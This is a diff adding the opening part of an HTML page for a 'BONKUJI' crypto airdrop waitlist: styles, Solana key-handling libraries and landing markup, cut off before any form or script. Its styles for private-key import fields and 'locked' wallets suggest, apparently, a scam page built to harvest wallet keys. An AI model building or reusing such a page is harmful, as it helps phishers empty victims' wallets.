@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>BONKUJI — Airdrop Waitlist</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/dist/tabler-icons.min.css"/>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/tweetnacl@1.0.3/nacl-fast.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/index.umd.js"></script>
+<style>
+:root {
+  --orange:#ff6200; --orange-bright:#ff8c00;
+  --orange-glow:rgba(255,98,0,0.35); --orange-soft:rgba(255,98,0,0.12);
+  --purple-deep:#0d0818; --purple-mid:#160d2e;
+  --surface:rgba(255,255,255,0.05); --surface-hover:rgba(255,255,255,0.08);
+  --border:rgba(255,255,255,0.09); --border-orange:rgba(255,98,0,0.5);
+  --text-primary:#ffffff; --text-secondary:rgba(255,255,255,0.6); --text-muted:rgba(255,255,255,0.35);
+  --green:#22c55e; --green-soft:rgba(34,197,94,0.12);
+  --red:#ef4444; --red-soft:rgba(239,68,68,0.12);
+  --gold:#f59e0b; --gold-soft:rgba(245,158,11,0.12);
+  --radius-sm:10px; --radius-md:14px; --radius-lg:20px; --radius-xl:26px;
+  --font-display:'Syne',sans-serif; --font-body:'DM Sans',sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{font-family:var(--font-body);background:var(--purple-deep);color:var(--text-primary);min-height:100vh;overflow-x:hidden;}
+.bg-canvas{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none;}
+.bg-mesh{position:absolute;inset:0;background:
+  radial-gradient(ellipse 70% 55% at 20% 0%,rgba(91,33,182,0.45) 0%,transparent 60%),
+  radial-gradient(ellipse 50% 40% at 85% 15%,rgba(180,60,255,0.2) 0%,transparent 55%),
+  radial-gradient(ellipse 60% 50% at 50% 100%,rgba(255,98,0,0.15) 0%,transparent 60%),
+  linear-gradient(180deg,#0d0818 0%,#100a22 40%,#0d0818 100%);}
+.stars-layer{position:absolute;inset:0;}
+.star{position:absolute;border-radius:50%;background:#fff;animation:starPulse var(--dur,3s) ease-in-out infinite alternate;animation-delay:var(--delay,0s);}
+@keyframes starPulse{0%{opacity:.1}100%{opacity:.9}}
+.aurora{position:absolute;border-radius:50%;filter:blur(60px);animation:auroraFloat 8s ease-in-out infinite alternate;}
+@keyframes auroraFloat{0%{transform:translateY(0) scale(1)}100%{transform:translateY(-30px) scale(1.1)}}
+.particle{position:absolute;width:4px;height:4px;border-radius:50%;background:var(--orange-bright);opacity:0;animation:particleFly var(--pdur,6s) ease-in-out infinite;animation-delay:var(--pdelay,0s);}
+@keyframes particleFly{0%{opacity:0;transform:translateY(0) scale(0)}20%{opacity:.8}80%{opacity:.3}100%{opacity:0;transform:translateY(-120px) scale(0.3)}}
+.app{position:relative;z-index:1;min-height:100vh;}
+#landingPage{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 20px 40px;}
+.landing-inner{width:100%;max-width:460px;}
+.site-header{display:flex;align-items:center;justify-content:space-between;padding:18px 0 0;margin-bottom:32px;}
+.logo{display:flex;align-items:center;gap:10px;font-family:var(--font-display);font-size:20px;font-weight:800;color:var(--text-primary);text-decoration:none;letter-spacing:-0.5px;}
+.logo-icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--orange) 0%,#c44a00 100%);display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 0 20px var(--orange-glow);}
+.logo-sub{font-size:10px;font-weight:500;color:var(--text-muted);letter-spacing:2px;text-transform:uppercase;display:block;line-height:1;}
+.header-badge{display:flex;align-items:center;gap:6px;background:var(--green-soft);border:1px solid rgba(34,197,94,0.25);border-radius:20px;padding:6px 12px;font-size:12px;font-weight:500;color:var(--green);}
+.pulse-dot{width:7px;height:7px;border-radius:50%;background:var(--green);animation:pulseDot 1.5s ease-in-out infinite;}
+@keyframes pulseDot{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,0.5)}50%{box-shadow:0 0 0 5px rgba(34,197,94,0)}}
+.hero-section{display:flex;align-items:flex-start;margin-bottom:24px;}
+.hero-left{flex:1;}
+.hero-eyebrow{display:inline-flex;align-items:center;gap:7px;background:var(--orange-soft);border:1px solid var(--border-orange);border-radius:20px;padding:5px 12px;font-size:12px;font-weight:600;color:var(--orange-bright);letter-spacing:.8px;text-transform:uppercase;margin-bottom:14px;}
+.hero-title{font-family:var(--font-display);font-size:clamp(36px,9vw,50px);font-weight:800;line-height:1.05;letter-spacing:-1.5px;color:var(--text-primary);margin-bottom:12px;}
+.hero-title .accent{color:var(--orange);}
+.hero-sub{font-size:14px;line-height:1.65;color:var(--text-secondary);font-weight:300;max-width:230px;}
+.hero-mascot{width:125px;flex-shrink:0;display:flex;align-items:flex-end;justify-content:flex-end;margin-top:-10px;animation:mascotFloat 4s ease-in-out infinite alternate;}
+@keyframes mascotFloat{0%{transform:translateY(0) rotate(-1deg)}100%{transform:translateY(-10px) rotate(1.5deg)}}
+.stats-strip{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:22px;}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-md);padding:14px 12px;text-align:center;}
+.stat-val{font-family:var(--font-display);font-size:20px;font-weight:800;color:var(--text-primary);line-height:1;margin-bottom:4px;}
+.stat-val.orange{color:var(--orange-bright);}
+.stat-label{font-size:11px;color:var(--text-muted);}
+.reveal-banner{display:flex;align-items:center;gap:12px;background:linear-gradient(135deg,rgba(245,158,11,0.1) 0%,rgba(255,98,0,0.08) 100%);border:1px solid rgba(245,158,11,0.3);border-radius:var(--radius-md);padding:14px 16px;margin-bottom:22px;}
+.reveal-banner i{font-size:24px;color:var(--gold);flex-shrink:0;}
+.reveal-text strong{display:block;font-family:var(--font-display);font-size:14px;font-weight:700;color:var(--gold);margin-bottom:2px;}
+.reveal-text span{font-size:12px;color:var(--text-secondary);}
+.countdown-chips{display:flex;gap:6px;margin-top:8px;}
+.cchip{background:rgba(245,158,11,0.15);border:1px solid rgba(245,158,11,0.25);border-radius:8px;padding:4px 10px;font-family:var(--font-display);font-size:13px;font-weight:700;color:var(--gold);}
+.cchip-lbl{font-size:9px;color:var(--text-muted);text-align:center;margin-top:1px;}
+.main-card{background:rgba(22,13,46,0.75);border:1px solid var(--border);border-radius:var(--radius-xl);padding:22px;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);box-shadow:0 24px 80px rgba(0,0,0,0.4),0 0 0 0.5px rgba(255,255,255,0.05) inset;position:relative;overflow:hidden;}
+.main-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.15),transparent);}
+.method-tabs{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:20px;}
+.method-tab{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--radius-md);padding:14px 8px 12px;cursor:pointer;position:relative;display:flex;flex-direction:column;align-items:center;gap:8px;transition:all 0.22s cubic-bezier(0.4,0,0.2,1);outline:none;}
+.method-tab:hover{background:var(--surface-hover);border-color:rgba(255,255,255,0.18);}
+.method-tab.active{background:rgba(255,98,0,0.1);border-color:var(--orange);box-shadow:0 0 20px rgba(255,98,0,0.15);}
+.tab-radio{width:13px;height:13px;border-radius:50%;border:2px solid var(--border);position:absolute;top:9px;left:50%;transform:translateX(-50%);transition:all 0.2s;display:flex;align-items:center;justify-content:center;}
+.method-tab.active .tab-radio{border-color:var(--orange);background:var(--orange);}
+.method-tab.active .tab-radio::after{content:'';width:4px;height:4px;border-radius:50%;background:#fff;}
+.tab-icon{margin-top:14px;font-size:22px;color:var(--text-secondary);transition:color 0.2s;}
+.method-tab.active .tab-icon{color:var(--orange-bright);}
+.tab-label{font-size:12px;font-weight:600;color:var(--text-secondary);text-align:center;line-height:1.3;transition:color 0.2s;}
+.method-tab.active .tab-label{color:var(--text-primary);}
+.form-section{display:none;animation:fadeIn 0.25s ease;}
+.form-section.active{display:block;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+.phantom-btn{width:100%;padding:15px 20px;background:linear-gradient(135deg,#ab9ff2 0%,#7b5cf0 100%);border:none;border-radius:var(--radius-md);font-family:var(--font-display);font-size:16px;font-weight:700;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:opacity 0.2s,transform 0.15s;box-shadow:0 8px 30px rgba(123,92,240,0.4);position:relative;overflow:hidden;margin-bottom:14px;}
+.phantom-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,0.15) 0%,transparent 50%);}
+.phantom-btn:hover{opacity:.9;box-shadow:0 12px 40px rgba(123,92,240,0.5);}
+.phantom-btn:active{transform:scale(0.98);}
+.phantom-btn:disabled{opacity:0.55;cursor:not-allowed;}
+.connected-wallet-display{background:rgba(34,197,94,0.07);border:1px solid rgba(34,197,94,0.25);border-radius:var(--radius-md);padding:14px 16px;margin-bottom:14px;display:none;}
+.cwd-row{display:flex;align-items:center;justify-content:space-between;}
+.cwd-badge{display:flex;align-items:center;gap:5px;font-size:12px;font-weight:600;color:var(--green);}
+.cwd-label{font-size:11px;color:var(--text-muted);margin-top:4px;}
+.field-input{width:100%;background:rgba(255,255,255,0.05);border:1.5px solid var(--border);border-radius:var(--radius-sm);padding:13px 16px;font-size:14px;color:var(--text-primary);font-family:var(--font-body);outline:none;transition:border-color 0.2s,background 0.2s;}
+.field-input::placeholder{color:var(--text-muted);}
+.field-input:focus{border-color:var(--border-orange);background:rgba(255,98,0,0.05);}
+.field-input.error{border-color:rgba(239,68,68,0.6);}
+.field-input.mono{font-family:monospace;font-size:13px;letter-spacing:0.5px;}
+.info-panel{display:flex;align-items:flex-start;gap:10px;border-radius:var(--radius-sm);padding:13px 14px;margin-bottom:14px;}
+.info-panel.purple{background:rgba(123,92,240,0.08);border:1px solid rgba(123,92,240,0.25);}
+.info-panel.gold{background:var(--gold-soft);border:1px solid rgba(245,158,11,0.25);}
+.info-panel i{font-size:18px;flex-shrink:0;margin-top:1px;}
+.info-panel.purple i{color:#a78bfa;}
+.info-panel.gold i{color:var(--gold);}
+.info-panel p{font-size:12.5px;color:var(--text-secondary);line-height:1.55;}
+.info-panel.purple strong{color:#c4b5fd;}
+.info-panel.gold strong{color:var(--gold);}
+.btn-primary{width:100%;padding:15px 20px;background:linear-gradient(135deg,#ff6200 0%,#c44a00 100%);border:none;border-radius:var(--radius-md);font-family:var(--font-display);font-size:16px;font-weight:700;color:#fff;cursor:pointer;letter-spacing:.3px;display:flex;align-items:center;justify-content:center;gap:10px;transition:opacity 0.2s,transform 0.15s,box-shadow 0.2s;box-shadow:0 8px 30px rgba(255,98,0,0.35);position:relative;overflow:hidden;}
+.btn-primary::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,0.12) 0%,transparent 50%);}
+.btn-primary:hover{opacity:.93;box-shadow:0 12px 40px rgba(255,98,0,0.45);}
+.btn-primary:active{transform:scale(0.98);}
+.btn-primary:disabled{opacity:.55;cursor:not-allowed;}
+.btn-x{background:#0f0f0f;border:1.5px solid rgba(255,255,255,0.15);box-shadow:0 4px 20px rgba(0,0,0,0.4);}
+.btn-x::before{display:none;}
+.btn-x:hover{background:#1a1a1a;}
+.spinner{width:17px;height:17px;border-radius:50%;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;animation:spin .7s linear infinite;display:none;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.result-card{border-radius:var(--radius-md);padding:16px;margin-top:14px;display:none;animation:fadeIn 0.3s ease;}
+.result-card.eligible{background:var(--green-soft);border:1px solid rgba(34,197,94,0.3);}
+.result-card.not-eligible{background:var(--red-soft);border:1px solid rgba(239,68,68,0.3);}
+.result-title{font-family:var(--font-display);font-size:15px;font-weight:700;margin-bottom:5px;}
+.result-card.eligible .result-title{color:var(--green);}
+.result-card.not-eligible .result-title{color:var(--red);}
+.result-body{font-size:13px;color:var(--text-secondary);line-height:1.5;}
+.checkbox-row{display:flex;align-items:flex-start;gap:11px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:13px;margin-top:12px;cursor:pointer;transition:background 0.2s;}
+.checkbox-row:hover{background:var(--surface-hover);}
+.checkbox-row input[type=checkbox]{width:17px;height:17px;accent-color:var(--orange);margin-top:2px;cursor:pointer;flex-shrink:0;}
+.checkbox-row span{font-size:13px;color:var(--text-secondary);line-height:1.5;}
+.url-bar-footer{display:flex;align-items:center;justify-content:center;gap:8px;background:rgba(255,255,255,0.04);border-radius:20px;padding:8px 16px;margin-top:16px;font-size:12px;color:var(--text-muted);font-family:monospace;}
+.x-icon-svg{width:18px;height:18px;fill:currentColor;flex-shrink:0;}
+#dashboardPage{display:none;min-height:100vh;padding:0 0 80px;}
+.dash-header{background:rgba(13,8,24,0.95);border-bottom:1px solid var(--border);padding:16px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;backdrop-filter:blur(20px);}
+.dash-logo{display:flex;align-items:center;gap:10px;font-family:var(--font-display);font-size:18px;font-weight:800;color:var(--text-primary);}
+.dash-user{display:flex;align-items:center;gap:10px;}
+.user-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--orange),#c44a00);display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#fff;box-shadow:0 0 15px var(--orange-glow);}
+.user-info{text-align:right;}
+.user-label{font-size:11px;color:var(--text-muted);}
+.user-addr{font-size:12px;font-weight:600;color:var(--text-secondary);font-family:monospace;}
+.dash-body{max-width:860px;margin:0 auto;padding:32px 24px;}
+.dash-title{font-family:var(--font-display);font-size:26px;font-weight:800;letter-spacing:-.8px;margin-bottom:4px;}
+.dash-subtitle{font-size:14px;color:var(--text-secondary);margin-bottom:28px;}
+.reveal-dash-banner{background:linear-gradient(135deg,rgba(245,158,11,0.1) 0%,rgba(255,98,0,0.07) 100%);border:1px solid rgba(245,158,11,0.3);border-radius:var(--radius-lg);padding:20px 22px;margin-bottom:28px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;}
+.rdb-left strong{display:block;font-family:var(--font-display);font-size:16px;font-weight:800;color:var(--gold);margin-bottom:4px;}
+.rdb-left span{font-size:13px;color:var(--text-secondary);}
+.rdb-countdown{display:flex;gap:8px;flex-shrink:0;}
+.rdb-unit{text-align:center;}
+.rdb-num{background:rgba(245,158,11,0.15);border:1px solid rgba(245,158,11,0.3);border-radius:8px;padding:8px 12px;font-family:var(--font-display);font-size:20px;font-weight:800;color:var(--gold);min-width:48px;display:block;text-align:center;}
+.rdb-lbl{font-size:10px;color:var(--text-muted);text-align:center;margin-top:4px;}
+.main-wallet-card{background:linear-gradient(135deg,rgba(255,98,0,0.1) 0%,rgba(91,33,182,0.1) 100%);border:1px solid rgba(255,98,0,0.3);border-radius:var(--radius-xl);padding:24px;margin-bottom:24px;position:relative;overflow:hidden;}
+.main-wallet-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,98,0,0.4),transparent);}
+.main-wallet-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;}
+.main-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,98,0,0.2);border:1px solid var(--border-orange);border-radius:20px;padding:5px 12px;font-size:11px;font-weight:700;color:var(--orange-bright);letter-spacing:1px;text-transform:uppercase;}
+.main-wallet-addr{font-family:monospace;font-size:14px;font-weight:600;color:var(--text-primary);word-break:break-all;margin-bottom:18px;}
+.main-wallet-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;}
+.mw-stat{background:rgba(0,0,0,0.2);border-radius:var(--radius-sm);padding:12px;text-align:center;}
+.mw-stat-val{font-family:var(--font-display);font-size:18px;font-weight:800;color:var(--orange-bright);margin-bottom:3px;}
+.mw-stat-label{font-size:11px;color:var(--text-muted);}
+.eligibility-status{display:flex;align-items:center;gap:10px;border-top:1px solid rgba(255,255,255,0.08);padding-top:16px;margin-top:16px;}
+.status-pill{display:inline-flex;align-items:center;gap:6px;border-radius:20px;padding:7px 14px;font-size:13px;font-weight:600;white-space:nowrap;}
+.status-pill.eligible{background:var(--green-soft);color:var(--green);border:1px solid rgba(34,197,94,0.3);}
+.status-pill.not-eligible{background:var(--red-soft);color:var(--red);border:1px solid rgba(239,68,68,0.3);}
+.status-pill.pending{background:var(--gold-soft);color:var(--gold);border:1px solid rgba(245,158,11,0.3);}
+.status-desc{font-size:13px;color:var(--text-secondary);}
+.section-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
+.section-title{font-family:var(--font-display);font-size:18px;font-weight:700;letter-spacing:-.3px;}
+.section-count{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:4px 12px;font-size:12px;color:var(--text-muted);}
+.add-wallet-panel{background:var(--surface);border:1.5px dashed rgba(255,255,255,0.12);border-radius:var(--radius-lg);padding:20px;margin-bottom:16px;}
+.add-wallet-panel:hover{border-color:rgba(255,98,0,0.25);background:rgba(255,98,0,0.03);}
+.awp-title{font-family:var(--font-display);font-size:14px;font-weight:700;margin-bottom:4px;}
+.awp-desc{font-size:12.5px;color:var(--text-muted);margin-bottom:16px;line-height:1.5;}
+.pk-input-wrap{position:relative;margin-bottom:12px;}
+.pk-input-wrap .field-input{padding-right:44px;}
+.pk-toggle{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:18px;padding:4px;transition:color 0.2s;}
+.pk-toggle:hover{color:var(--text-secondary);}
+.btn-import{width:100%;padding:13px 20px;background:rgba(255,98,0,0.15);border:1.5px solid var(--border-orange);border-radius:var(--radius-md);font-family:var(--font-display);font-size:14px;font-weight:700;color:var(--orange-bright);cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all 0.2s;}
+.btn-import:hover{background:rgba(255,98,0,0.22);box-shadow:0 4px 20px rgba(255,98,0,0.2);}
+.btn-import:disabled{opacity:0.5;cursor:not-allowed;}
+.security-note{display:flex;align-items:flex-start;gap:9px;background:rgba(239,68,68,0.07);border:1px solid rgba(239,68,68,0.2);border-radius:var(--radius-sm);padding:12px;margin-top:12px;}
+.security-note i{font-size:16px;color:var(--red);flex-shrink:0;margin-top:1px;}
+.security-note p{font-size:12px;color:rgba(255,255,255,0.55);line-height:1.5;}
+.security-note strong{color:rgba(239,68,68,0.9);}
+.wallet-list{display:flex;flex-direction:column;gap:10px;}
+.wallet-item{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-md);padding:16px;display:grid;grid-template-columns:auto 1fr auto;gap:14px;align-items:center;transition:border-color 0.2s,background 0.2s;animation:slideIn 0.3s ease;}
+@keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:none}}
+.wallet-item:hover{background:var(--surface-hover);border-color:rgba(255,255,255,0.14);}
+.wallet-item.checking{border-color:rgba(245,158,11,0.3);background:var(--gold-soft);}
+.wallet-item.eligible-item{border-color:rgba(34,197,94,0.22);}
+.wallet-item.not-eligible-item{border-color:rgba(239,68,68,0.18);}
+.wallet-item.locked-item{border-color:rgba(255,98,0,0.25);}
+.wallet-idx{width:32px;height:32px;border-radius:8px;background:rgba(255,255,255,0.06);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--font-display);font-size:13px;font-weight:700;color:var(--text-muted);}
+.wallet-info{min-width:0;}
+.wallet-item-addr{font-family:monospace;font-size:13px;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:5px;}
+.wallet-item-meta{display:flex;align-items:center;gap:6px;flex-wrap:wrap;}
+.wallet-tag{font-size:11px;border-radius:6px;padding:2px 8px;font-weight:500;}
+.wallet-tag.status-eligible{background:var(--green-soft);color:var(--green);}
+.wallet-tag.status-not{background:var(--red-soft);color:var(--red);}
+.wallet-tag.status-checking{background:var(--gold-soft);color:var(--gold);}
+.wallet-tag.locked{background:rgba(255,98,0,0.12);color:var(--orange-bright);}
+.wallet-tag.alloc{background:rgba(255,98,0,0.1);color:var(--orange-bright);}
+.wallet-actions{display:flex;align-items:center;gap:6px;}
+.icon-btn{width:32px;height:32px;border-radius:8px;background:transparent;border:1px solid var(--border);color:var(--text-muted);cursor:pointer;font-size:16px;display:flex;align-items:center;justify-content:center;transition:all 0.18s;}
+.icon-btn:hover{background:var(--surface-hover);color:var(--text-primary);border-color:rgba(255,255,255,0.2);}
+.icon-btn[disabled]{opacity:.35;cursor:not-allowed;pointer-events:none;}
+.empty-state{text-align:center;padding:36px 20px;border:1.5px dashed rgba(255,255,255,0.08);border-radius:var(--radius-lg);}
+.empty-icon{font-size:38px;color:var(--text-muted);margin-bottom:10px;}
+.empty-title{font-family:var(--font-display);font-size:16px;font-weight:700;margin-bottom:5px;}
+.empty-desc{font-size:13px;color:var(--text-muted);}
+.summary-bar{background:rgba(13,8,24,0.9);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px 22px;margin-top:24px;display:none;grid-template-columns:repeat(4,1fr);text-align:center;}
+.summary-item{padding:0 12px;}
+.summary-item+.summary-item{border-left:1px solid var(--border);}
+.summary-val{font-family:var(--font-display);font-size:22px;font-weight:800;margin-bottom:4px;}
+.summary-val.green{color:var(--green);}
+.summary-val.orange{color:var(--orange-bright);}
+.summary-val.muted{color:var(--text-secondary);}
+.summary-val.gold{color:var(--gold);}
+.summary-lbl{font-size:11px;color:var(--text-muted);}
+.summary-note{grid-column:1/-1;border-top:1px solid var(--border);margin-top:14px;padding-top:14px;font-size:12px;color:var(--text-muted);text-align:center;}
+.summary-note strong{color:var(--gold);}
+.locked-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(255,98,0,0.1);border:1px solid rgba(255,98,0,0.25);border-radius:20px;padding:4px 10px;font-size:11px;font-weight:600;color:var(--orange-bright);}
+.modal-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;padding:24px;}
+.modal-overlay.open{display:flex;animation:fadeIn 0.2s ease;}
+.modal-box{background:#140c28;border:1px solid var(--border);border-radius:var(--radius-xl);padding:28px;max-width:420px;width:100%;box-shadow:0 24px 80px rgba(0,0,0,0.7);position:relative;}
+.modal-box::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.12),transparent);}
+.modal-title{font-family:var(--font-display);font-size:20px;font-weight:800;margin-bottom:8px;}
+.modal-desc{font-size:14px;color:var(--text-secondary);line-height:1.6;margin-bottom:20px;}
+.modal-addr{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);padding:10px 14px;font-family:monospace;font-size:12px;color:var(--text-secondary);word-break:break-all;margin-bottom:20px;}
+.modal-actions{display:flex;gap:10px;}
+.btn-cancel{flex:1;padding:13px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-md);color:var(--text-secondary);font-family:var(--font-body);font-size:14px;font-weight:500;cursor:pointer;transition:background 0.2s;}
+.btn-cancel:hover{background:var(--surface-hover);}
+.btn-confirm{flex:1;padding:13px;background:linear-gradient(135deg,var(--orange),#c44a00);border:none;border-radius:var(--radius-md);color:#fff;font-family:var(--font-display);font-size:14px;font-weight:700;cursor:pointer;transition:opacity 0.2s;}
+.btn-confirm:hover{opacity:.88;}
+.toast-container{position:fixed;bottom:24px;right:24px;z-index:999;display:flex;flex-direction:column;gap:10px;}
+.toast{background:rgba(22,13,46,0.97);border:1px solid var(--border);border-radius:var(--radius-md);padding:14px 18px;font-size:14px;color:var(--text-primary);backdrop-filter:blur(16px);display:flex;align-items:center;gap:10px;box-shadow:0 8px 30px rgba(0,0,0,0.4);animation:toastIn 0.3s ease,toastOut 0.3s ease 2.7s forwards;max-width:320px;}
+@keyframes toastIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+@keyframes toastOut{to{opacity:0;transform:translateY(6px)}}
+.toast i{font-size:18px;flex-shrink:0;}
+.toast.success i{color:var(--green);}
+.toast.error i{color:var(--red);}
+.toast.info i{color:var(--orange-bright);}
+@media(max-width:600px){
+  .main-wallet-stats{grid-template-columns:repeat(2,1fr);}
+  .summary-bar{grid-template-columns:repeat(2,1fr);}
+  .summary-item+.summary-item{border-left:none;}
+  .summary-item:nth-child(2n+1){border-right:1px solid var(--border);}
+  .summary-item{padding:8px;}
+  .dash-body{padding:20px 16px;}
+  .dash-header{padding:14px 16px;}
+  .rdb-countdown{gap:5px;}
+  .rdb-num{font-size:16px;min-width:38px;padding:7px 8px;}
+}
+</style>
+</head>
+<body>
+
+<div class="bg-canvas">
+  <div class="bg-mesh"></div>
+  <div class="stars-layer" id="starsLayer"></div>
+  <div class="aurora" style="width:300px;height:300px;background:rgba(91,33,182,0.22);top:-80px;left:-60px;animation-duration:9s"></div>
+  <div class="aurora" style="width:200px;height:200px;background:rgba(255,98,0,0.1);bottom:100px;right:-50px;animation-duration:7s;animation-delay:2s"></div>
+  <div class="aurora" style="width:150px;height:150px;background:rgba(180,60,255,0.13);top:40%;right:10%;animation-duration:11s;animation-delay:4s"></div>
+</div>
+
+<div class="app">
+
+<div id="landingPage">
+  <div class="landing-inner">
+    <header class="site-header">
+      <a class="logo" href="#">
+        <div class="logo-icon">🐕</div>
+        <div>BONKUJI<span class="logo-sub">Airdrop Portal</span></div>
+      </a>
+      <div class="header-badge"><div class="pulse-dot"></div> Live</div>
+    </header>
+
+    <div class="hero-section">
+      <div class="hero-left">
+        <div class="hero-eyebrow"><i class="ti ti-bolt"></i> $BONKUJI Token</div>
+        <h1 class="hero-title">Something<br>new is<br><span class="accent">coming</span></h1>
+        <p class="hero-sub">Join the waitlist for first access &amp; lock in your airdrop eligibility.</p>
+      </div>
+      <div class="hero-mascot">
+        <svg viewBox="0 0 130 150" fill="none" xmlns="http://www.w3.org/2000/svg" width="125" height="145">
+          <ellipse cx="65" cy="142" rx="32" ry="6" fill="rgba(0,0,0,0.3)"/>
+          <ellipse cx="65" cy="78" rx="38" ry="40" fill="#e8720c"/>
+          <ellipse cx="65" cy="83" rx="30" ry="32" fill="#f07d1a"/>
+          <ellipse cx="65" cy="91" rx="22" ry="18" fill="#ffd4a0"/>
+          <circle cx="49" cy="72" r="8" fill="#ffd4a0"/><circle cx="81" cy="72" r="8" fill="#ffd4a0"/>
+          <circle cx="49" cy="72" r="4.5" fill="#1a0a00"/><circle cx="81" cy="72" r="4.5" fill="#1a0a00"/>
+          <circle cx="50" cy="71" r="1.8" fill="#fff"/><circle cx="82" cy="71" r="1.8" fill="#fff"/>
+          <ellipse cx="65" cy="84" rx="7" ry="4.5" fill="#1a0a00"/>
+          <ellipse cx="65" cy="85.5" rx="6" ry="3" fill="#e05080"/>
+          <path d="M33 50 Q26 33 34 26 Q41 21 46 30" fill="#e8720c"/>
+          <path d="M97 50 Q104 33 96 26 Q89 21 84 30" fill="#e8720c"/>
+          <path d="M33 50 Q27 35 36 28 Q42 23 46 30" fill="#f8922a"/>
+          <path d="M97 50 Q103 35 94 28 Q88 23 84 30" fill="#f8922a"/>
+          <ellipse cx="36" cy="114" rx="13" ry="11" fill="#e8720c" transform="rotate(-15 36 114)"/>
+          <ellipse cx="94" cy="114" rx="13" ry="11" fill="#e8720c" transform="rotate(15 94 114)"/>
+          <ellipse cx="47" cy="126" rx="9" ry="7" fill="#f07d1a"/>
+          <ellipse cx="83" cy="126" rx="9" ry="7" fill="#f07d1a"/>
+          <rect x="78" y="62" width="48" height="65" rx="10" fill="#7b3fe4"/>
+          <rect x="80" y="64" width="44" height="61" rx="8" fill="#5a2db5"/>
+          <rect x="82" y="66" width="40" height="57" rx="6" fill="#4a22a0"/>
+          <text x="102" y="102" font-size="22" font-weight="900" fill="#ff6200" text-anchor="middle" font-family="sans-serif" transform="rotate(-5 102 102)">ボ</text>
+          <text x="102" y="76" font-size="13" font-weight="700" fill="#ffaa44" text-anchor="middle" font-family="sans-serif">犬</text>
+          <circle cx="90" cy="74" r="9" fill="#ff6200" opacity="0.85"/>
+          <text x="90" y="78" font-size="11" font-weight="700" fill="#fff" text-anchor="middle" font-family="sans-serif">uj</text>
+        </svg>
+      </div>
+    </div>
+
+    <div class="stats-strip">
+      <div class="stat-card"><div class="stat-val orange">1B</div><div class="stat-label">Total Supply</div></div>
+      <div class="stat-card"><div class="stat-val orange">30%</div><div class="stat-label">Airdrop Pool</div></div>
+      <div class="stat-card"><div class="stat-val" id="countStat">12,847</div><div class="stat-label">Waitlisted</div></div>
+    </div>
+
+    <div class="reveal-banner">
+      <i class="ti ti-calendar-event"></i>
+      <div class="reveal-text">
+        <strong>Allocations revealed June 15, 2025</strong>
+        <span>Final totals per wallet will be published on snapshot date. Join now to secure your spot.</span>
+        <div class="countdown-chips">
+          <div><div class="cchip" id="lcd-d">--</div><div class="cchip-lbl">days</div></div>
+          <div><div class="cchip" id="lcd-h">--</div><div class="cchip-lbl">hrs</div></div>
+          <div><div class="cchip" id="lcd-m">--</div><div class="cchip-lbl">min</div></div>
+          <div><div class="cchip" id="lcd-s">--</div><div class="cchip-lbl">sec</div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="main-card">
